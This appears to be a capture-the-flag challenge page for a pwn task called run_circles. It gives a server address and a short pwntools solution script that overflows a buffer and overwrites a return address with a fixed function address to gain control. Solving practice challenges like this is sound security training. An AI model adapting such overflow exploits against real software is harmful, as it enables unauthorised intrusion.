#### Goals
 * Try to find the flag

#### Server Address
 * nc pwn.sniperoj.com 20000

#### Solution
```python
#!/usr/bin/env python

from pwn import *

# context(os='linux', arch='amd64', log_level='debug')

Io = process("./run_circles")
#Io = remote("pwn.sniperoj.cn", 30013)

Io.sendline("1024")
Io.sendline("A")
Io.sendline("B" * 256 + "C" * 24 + p64(0x400806))
Io.sendline("0")

Io.interactive()
```



#### Writeups
 * [Offical Writeup]()
 * [Other Writeup]()

